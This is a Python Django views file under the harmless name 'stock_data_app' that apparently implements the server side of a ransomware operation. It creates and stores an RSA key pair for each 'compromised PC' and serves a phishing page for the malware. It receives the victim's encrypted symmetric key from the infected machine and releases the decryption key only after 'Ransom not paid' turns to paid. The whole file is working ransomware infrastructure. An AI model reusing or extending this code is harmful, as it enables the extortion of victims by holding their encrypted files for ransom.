# stock_data_app/views.py
# from django.shortcuts import render
from django.http import HttpResponseRedirect, JsonResponse, HttpResponseNotFound
from django.shortcuts import render, redirect
from django.urls import reverse
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from django.views.decorators.csrf import csrf_exempt
from base64 import b64encode, b64decode
from json import loads
from uuid import uuid4, UUID
from .models import Keys
import secrets

def generate_keypair(request):
    if request.method == 'GET':
        if request.headers['api-key'] == 'secretkey' and not request.GET.get('uuid'):
            # Generate token for test (Comennt later)
            unique_email_token = secrets.token_urlsafe(199)            
            # Generate key pair
            rsa_key = RSA.generate(3072)
            private_rsa_key = rsa_key.export_key(
                                            pkcs=8,
                                            protection='PBKDF2WithHMAC-SHA512AndAES256-CBC',
                                            prot_params={'iteration_count':131072}
                                            )
            public_rsa_key = rsa_key.public_key().export_key()
            
            # Comment later 
            # print(private_rsa_key, public_rsa_key)
            
            uuid_number = str(uuid4())
            key_store = Keys.objects.create(private_key=private_rsa_key, public_key=public_rsa_key, uuid_compromised_pc=uuid_number, unique_email_token=unique_email_token)
            key_store.save()
            # ## Encrypt (Comment later)
            # rsa_key = RSA.importKey(public_rsa_key)
            # cipher = PKCS1_OAEP.new(rsa_key)
            # cipher_encrypt_key = cipher.encrypt(secret_key_symetric.encode(encoding="utf-8") )
            # print(b64encode(cipher_encrypt_key).decode('utf8'))
            # # Decrypt (Comment later)
            # rsa_key = RSA.importKey(private_rsa_key)
            # cipher = PKCS1_OAEP.new(rsa_key)
            # cipher_decrypt_key = cipher.decrypt(cipher_encrypt_key)
            # print(cipher_decrypt_key)
            response = {"public_key" : public_rsa_key.decode(encoding='utf-8'), "uuid": uuid_number}
            return JsonResponse(response)
        elif request.headers['api-key'] == 'secretkey' and request.GET.get('uuid'):
            # Validate UUID
            try:
                uuid = UUID(request.GET.get('uuid'), version=4)
                key_store = Keys.objects.get(uuid_compromised_pc=uuid)
                # print(key_store.uuid_compromised_pc)
                return JsonResponse({"uuid": key_store.uuid_compromised_pc, "public_key": key_store.public_key.decode(encoding='utf8')})
            except:
                return HttpResponseNotFound("Not Found")

    return HttpResponseNotFound("Not Found")

def serve_malware_page_phishing(request):
    
    return render(request, "phishing/templates/phishing.html")

@csrf_exempt
def receive_json_from_malware(request):
    if request.method == 'POST':
        try:
            json_body = loads(request.body)
            print(json_body['uuid'], json_body['key'])
            
            key_update = Keys.objects.get(uuid_compromised_pc=json_body['uuid'])
            key_update.encrypted_symetric_key = json_body['key'].encode(encoding='utf-8')
            key_update.save(update_fields=['encrypted_symetric_key'])
            
            return JsonResponse({"status": "ok"})
        except:
            raise
            return HttpResponseNotFound('Not Found')
    return HttpResponseNotFound('Not Found')

        
def recieve_private_key(request):
    if request.method == 'GET':
        try:
            uuid = UUID(request.GET.get('uuid'), version=4)
            key_store = Keys.objects.get(uuid_compromised_pc=uuid)
        except ValueError:
            return HttpResponseNotFound("Not Found")
        
        if key_store.paid_status == False:
            return HttpResponseNotFound("Ransom not paid")
        try:
            if request.GET.get("uniqueToken", None) == key_store.unique_email_token and key_store.paid_status == True:
                private_rsa_key = key_store.private_key
                encrypted_sim_key = b64decode(key_store.encrypted_symetric_key)
                print(encrypted_sim_key)
                rsa_key = RSA.importKey(private_rsa_key)
                cipher = PKCS1_OAEP.new(rsa_key)
                cipher_decrypt_key = cipher.decrypt(encrypted_sim_key)
                return JsonResponse({"sim_key": b64encode(cipher_decrypt_key).decode("utf-8")})
        except:
            return HttpResponseNotFound("Error on getting the simmetric key")
        
    return HttpResponseNotFound("Not Found")
        
    

def home(request):
    return render(request, 'home.html')